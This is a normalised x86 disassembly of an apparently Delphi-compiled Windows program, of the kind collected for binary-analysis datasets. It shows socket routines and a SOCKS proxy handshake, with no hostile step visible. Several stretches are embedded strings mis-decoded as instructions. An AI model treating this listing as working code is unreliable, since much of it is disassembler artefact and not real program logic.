jle r-xdata
pop esi
pop ebx
retn
add [ eax + esi * 4 + 0x50 ] ecx
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ecx [ eax + esi * 4 + 0x50 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_463fe8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
lea edi [ eax + eax * 2 ]
cmp [ esi + edi * 4 + 0x58 ] 0x1
jne r-xdata
dec [ esi + edi * 4 + 0x58 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4a ] 0x0
je r-xdata
mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_46404d
xor al 0x48
add [ ebp + esi + 0x34880048 ] bh
dec eax
add [ eax ] bh
cmp [ eax ] cl
test [ eax + ecx * 2 ] dh
add [ esi + esi + 0x48 ] bl
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4640a0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4640a7
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_404afc
sub_46425d
inc ebp
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc al 0x45
dec ecx
push ebx
outsd
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc eax 0x43644945
outsd
jne r-xdata
popad
outsb
insb
inc ebp
jb r-xdata
jb r-xdata
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x43 ] cl
inc esi
add [ eax + eax ] cl
add [ eax ] al
xor al 0x42
inc esi
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
outsd
jb r-xdata
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
xlat
add al 0x0
add [ ecx + rw-data ] ah
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
mov al 0x43
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004643 ] dh
add [ eax ] al
add [ edx + eax * 2 ] dh
inc esi
add al ch
xor al 0x40
add ah dh
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb [ ebp + 0x49 ] al
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
adc eax [ ebp + 0x49 ]
dec ecx
outsb
jbe r-xdata
imul ebp [ esi + 0x64 ] 0x74726f50
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
inc eax
add ah ah
inc edx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
inc edx
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
arpl [ ebx + 0x65 ] bp
je r-xdata
ror [ eax + 0x43 ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add [ eax + eax ] cl
add [ eax ] al
xor al 0x42
inc esi
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x42
add [ edx + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x46 ] 0x0
or al 0x0
add [ eax ] al
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_46171c
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl 0x1
mov eax ebx
call sub_4648bc
sub_4643c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
call sub_46171c
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_4648bc
sub_464400
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] 0x0
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x1
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
sub_464434
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edx
mov edx [ ebx + 0xc ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_464874
mov eax ebx
call sub_464898
sub_46446c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4147c4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_46449c
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x48 ]
pop ebx
pop ebp
retn 0x4
sub_4644c0
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x54 ]
pop ebx
pop ebp
retn 0x4
sub_4644e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx esi
mov edx [ ebx + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4616c8
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_464524
push ebp
mov ebp esp
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov eax [ eax + 0xc ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0x4c ]
pop ebx
pop ebp
retn 0xc
sub_464550
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_464664
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax ebx
call sub_4648ec
test al al
jne r-xdata
cmp [ ebx + 0x24 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46466b
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_404098
retn
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x28 ]
jle r-xdata
mov eax ebx
call sub_464940
test al al
jne r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
jmp r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov eax [ ebx + 0x28 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
jmp r-xdata
sub_464670
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebx + 0x18 ]
mov edx esi
call sub_4040c8
mov [ ebx + 0x20 ] edi
pop edi
pop esi
pop ebx
retn
sub_46468c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_41478c
mov dl 0x1
mov eax edi
call sub_4648bc
xor eax eax
mov [ edi + 0x24 ] eax
xor eax eax
mov [ edi + 0x28 ] eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
test bl bl
je r-xdata
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4646e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464815
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ r-xdata ]
call sub_463a2c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4647f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_413c88
push 0x0
push esi
mov eax [ rw-data ]
mov eax [ eax ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x50 ]
dec eax
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
sete dl
xor ecx ecx
mov eax [ r-xdata ]
call sub_4639e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032a0
retn
cmp esi 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
cmp esi eax
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x34 ]
mov eax ebx
call sub_4646e4
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx esi
sub edx eax
mov eax ebx
call sub_4646e4
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46481c
lea eax [ ebp - 0xc ]
call sub_404074
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x34 ]
sub_464828
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4031e8
mov edi eax
mov eax esi
call sub_4031e8
cmp edi eax
je r-xdata
lea eax [ ebx + 0x14 ]
mov edx [ esi + 0x14 ]
call sub_4040c8
mov eax [ esi + 0x1c ]
mov [ ebx + 0x1c ] eax
lea eax [ ebx + 0x18 ]
mov edx [ esi + 0x18 ]
call sub_4040c8
mov eax [ esi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov edx esi
mov eax ebx
call sub_414434
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_464874
push ebx
push ecx
lea edx [ eax + 0x14 ]
push edx
lea edx [ eax + 0x1c ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x74 ]
pop edx
pop ebx
retn
sub_464898
push ebx
push ecx
lea edx [ eax + 0x18 ]
push edx
lea edx [ eax + 0x20 ]
push edx
lea ecx [ esp + 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0xc ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x70 ]
pop edx
pop ebx
retn
sub_4648bc
push ebx
mov ebx eax
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
test dl dl
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_404074
xor eax eax
mov [ ebx + 0x20 ] eax
pop ebx
retn
lea eax [ ebx + 0x14 ]
call sub_404074
xor eax eax
mov [ ebx + 0x1c ] eax
sub_4648ec
push ebx
push esi
push ecx
mov esi eax
push 0x0
mov eax [ esi + 0x14 ]
push eax
mov eax [ esi + 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx 0x2
mov edx [ esi + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx eax
mov [ esp + 0x4 ] 0x2740
lea ecx [ esp + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4616d4
mov ebx eax
xor bl 0x1
test bl bl
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_464874
sub_464940
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov edi [ ebp + 0x28 ]
mov esi [ ebp + 0x24 ]
sub esi edi
jg r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
dec esi
dec edi
inc esi
jne r-xdata
mov bl 0x1
jmp r-xdata
mov [ ebp + 0x1c ] edi
mov eax ebp
call sub_4648ec
test al al
je r-xdata
sub_464970
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_464995
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46499c
retn
sub_464be0
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x30 ] esi
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_464c40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx + 0x52 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
push 0x0
push 0x0
mov eax esi
call sub_415e9c
sub_464c70
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
push 0x0
push 0x0
mov eax esi
call sub_415e9c
sub_464ca0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41a400
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x34 ]
jne r-xdata
xor eax eax
mov [ esi + 0x34 ] eax
sub_464d14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_464d39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464d40
retn
sub_464e3c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_463e38
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_464e70
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_464e95
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464e9c
retn
sub_46502c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41478c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x10 ] eax
mov eax esi
call sub_465010
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_465078
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
lea eax [ esi + 0x10 ]
call sub_40d01c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4147c4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4650a8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4651a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_465010
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4651aa
lea eax [ ebp - 0x1c ]
mov edx 0x5
call sub_404098
retn
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx 0x4
mov edx 0x1
call sub_404594
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407f4c
mov eax [ ebp - 0xc ]
call sub_404334
cmp eax 0x4
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax esi
call sub_46521c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
inc ebx
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4046c0
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x5
call sub_404594
mov edx [ ebp - 0x18 ]
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc [ ebp - 0x8 ]
dec ebx
jne r-xdata
sub_4651b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4651ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebx + 0xc ] esi
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465206
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_40804c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x14 ]
call sub_4040c8
sub_46521c
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x14 ]
mov edx esi
call sub_4040c8
mov eax esi
call sub_404334
test eax eax
jle r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax esi
call sub_4081c4
mov [ ebx + 0xc ] eax
sub_465248
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46526d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465274
retn
sub_465280
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4652a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4652ac
retn
sub_46556c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_463da0
mov [ esi + 0x68 ] 0x0
mov [ esi + 0x7c ] 0x0
mov [ esi + 0x74 ] 0x438
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4655b0
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x124 ] ebx
mov [ ebp - 0x120 ] ebx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x118 ] ebx
mov [ ebp - 0x114 ] ebx
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4657b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x110 ] 0x4
mov [ ebp - 0x10f ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10e ] ax
cmp [ esi + 0x7c ] 0x2
jne r-xdata
lea ecx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_461814
mov edx [ ebp - 0x114 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_461dcc
mov [ ebp - 0x10c ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_461dcc
mov [ ebp - 0x10c ] eax
jmp r-xdata
add ebx 0x9
lea edx [ ebp - 0x110 ]
mov ecx ebx
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x58 ]
lea edx [ ebp - 0x8 ]
mov ecx 0x8
mov eax [ esi + 0x80 ]
mov ebx [ eax ]
call [ ebx + 0x54 ]
mov al [ ebp - 0x7 ]
sub al 0x5a
je r-xdata
mov eax edi
call sub_404334
push eax
mov eax edi
call sub_404534
lea edx [ ebp + ebx - 0x106 ]
pop ecx
call sub_4028c8
mov eax edi
call sub_404334
inc ebx
add eax ebx
mov ebx eax
mov [ ebp + ebx - 0x107 ] 0x0
lea eax [ ebp - 0x108 ]
mov edx [ esi + 0x78 ]
mov ecx 0xff
call sub_404310
xor ebx ebx
mov bl [ ebp - 0x108 ]
mov [ ebp + ebx - 0x107 ] 0x0
cmp [ esi + 0x7c ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4657c0
lea eax [ ebp - 0x124 ]
mov edx 0x5
call sub_404098
retn
dec al
je r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x11c ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x11c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x120 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x124 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x124 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
sub_4657d8
push ebp
mov ebp esp
push ecx
mov ecx 0x29
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x68 ] 0x0
jne r-xdata
mov [ ebp - 0x10e ] 0x2
mov [ ebp - 0x10e ] 0x0
jmp r-xdata
mov al [ ebp - 0x10f ]
cmp al [ ebp - 0xd ]
jne r-xdata
mov al [ ebp - 0x10e ]
mov [ ebp - 0xd ] al
mov [ ebp - 0x110 ] 0x5
mov al 0x1
mov [ ebp - 0x10f ] al
and eax 0xff
add eax 0x2
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx [ ebp - 0xc ]
mov esi [ eax ]
call [ esi + 0x58 ]
xor edx edx
push ebp
push j_sub_40386c#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x2
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x118 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x118 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
cmp al 0xff
jne r-xdata
mov [ ebp - 0x110 ] 0x5
mov [ ebp - 0x10f ] 0x1
mov [ ebp - 0x10e ] 0x0
mov [ ebp - 0x10d ] 0x3
mov eax [ ebp - 0x4 ]
call sub_404334
mov [ ebp - 0x10c ] al
mov esi 0x5
mov eax [ ebp - 0x4 ]
call sub_404334
test eax eax
jle r-xdata
mov [ ebp - 0x110 ] 0x1
mov eax [ ebx + 0x78 ]
call sub_404334
mov [ ebp - 0x10f ] al
mov esi 0x2
mov eax [ ebx + 0x78 ]
call sub_404334
test eax eax
jle r-xdata
cmp [ ebx + 0x68 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404334
add esi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov [ ebp - 0x10 ] ax
lea edx [ ebp + esi - 0x110 ]
lea eax [ ebp - 0x10 ]
mov ecx 0x2
call sub_4028c8
add esi 0x2
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx esi
mov esi [ eax ]
call [ esi + 0x58 ]
xor eax eax
push ebp
push sub_465b0b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x110 ]
mov eax [ ebx + 0x80 ]
mov ecx 0x5
mov esi [ eax ]
call [ esi + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404334
push eax
mov eax [ ebp - 0x4 ]
call sub_404534
lea edx [ ebp + esi - 0x110 ]
pop ecx
call sub_4028c8
mov eax [ ebx + 0x78 ]
call sub_404334
add esi eax
mov eax [ ebx + 0x70 ]
call sub_404334
mov [ ebp + esi - 0x110 ] al
inc esi
